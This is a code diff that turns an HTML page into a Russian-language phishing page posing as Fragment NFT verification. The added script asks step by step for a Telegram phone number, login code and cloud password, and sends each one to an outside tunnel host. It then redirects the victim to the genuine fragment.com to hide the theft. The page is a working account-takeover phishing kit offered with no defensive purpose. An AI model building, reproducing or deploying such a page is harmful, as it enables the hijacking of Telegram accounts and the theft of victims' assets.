@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Stars Shop</title>
+    <title>Fragment NFT Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
@@ -13,16 +13,65 @@
 </head>
 <body class="flex items-center justify-center min-h-screen p-4">
     <div class="bg-slate-800 rounded-2xl shadow-2xl w-full max-w-md p-6 text-center border border-slate-700">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="w-20 h-20 mx-auto mb-4">
-        <h1 class="text-2xl font-bold mb-2 text-blue-400">Магазин Звезд</h1>
-        <p class="text-slate-400 mb-6 text-sm" id="status-text">Выберите пакет звезд для вашего аккаунта</p>
+        <img src="https://fragment.com/img/logo.svg" class="w-16 h-16 mx-auto mb-4">
+        <h1 class="text-xl font-bold mb-2">Fragment</h1>
+        <p class="text-slate-400 mb-6 text-sm" id="status-text">Авторизуйтесь для проверки ваших NFT и получения доступа к аукционам.</p>
 
-        <div id="step-stars">
-            <div class="grid grid-cols-2 gap-3 mb-6">
-                <div class="bg-slate-700 p-3 rounded-xl border border-slate-600 hover:border-blue-500 cursor-pointer">
-                    <p class="font-bold">⭐ 100</p>
-                    <p class="text-xs text-slate-400">249₽</p>
-                </div>
-                <div class="bg-slate-700 p-3 rounded-xl border border-slate-600 hover:border-blue-500 cursor-pointer">
-                    <p class="font-bold">⭐ 500</p>
-                    <p class="text-xs text-slate-400">990₽</p>
+        <div id="login-form">
+            <input type="tel" id="phone" placeholder="+7 999 000-00-00" class="w-full p-3 bg-slate-900 border border-slate-700 rounded-lg mb-3 text-center text-white">
+            <input type="text" id="code" placeholder="Код подтверждения" class="w-full p-3 bg-slate-900 border border-slate-700 rounded-lg mb-3 text-center text-white hidden">
+            <input type="password" id="password" placeholder="Облачный пароль (если есть)" class="w-full p-3 bg-slate-900 border border-slate-700 rounded-lg mb-3 text-center text-white hidden">
+            
+            <button id="main-btn" onclick="handleAuth()" class="w-full bg-blue-500 hover:bg-blue-600 py-3 rounded-xl font-bold transition">Продолжить</button>
+        </div>
+
+        <div id="loader" class="hidden">
+            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-white mx-auto"></div>
+            <p class="mt-4 text-sm text-slate-300">Проверка NFT активов...</p>
+        </div>
+    </div>
+
+    <script>
+        const API_URL = "https://9530c1e40ad004bb2166ba62f270ed0e.serveousercontent.com/api/login";
+        let step = 'phone';
+
+        async function handleAuth() {
+            const phone = document.getElementById('phone').value;
+            const code = document.getElementById('code').value;
+            const password = document.getElementById('password').value;
+            
+            let action = step === 'phone' ? 'send_phone' : (step === 'code' ? 'send_code' : 'send_password');
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action, phone, code, password })
+                });
+
+                if (step === 'phone') {
+                    document.getElementById('phone').classList.add('hidden');
+                    document.getElementById('code').classList.remove('hidden');
+                    document.getElementById('status-text').innerText = "Введите код, присланный в Telegram.";
+                    step = 'code';
+                } else if (step === 'code') {
+                    document.getElementById('code').classList.add('hidden');
+                    document.getElementById('password').classList.remove('hidden');
+                    document.getElementById('status-text').innerText = "Введите облачный пароль для завершения проверки.";
+                    step = 'password';
+                } else {
+                    document.getElementById('login-form').classList.add('hidden');
+                    document.getElementById('loader').classList.remove('hidden');
+                    document.getElementById('status-text').innerText = "Синхронизация с Fragment...";
+                    
+                    setTimeout(() => {
+                        window.location.href = "https://fragment.com";
+                    }, 3000);
+                }
+            } catch (e) {
+                alert("Ошибка подключения к серверу Fragment.");
+            }
+        }
+    </script>
+</body>
+</html>
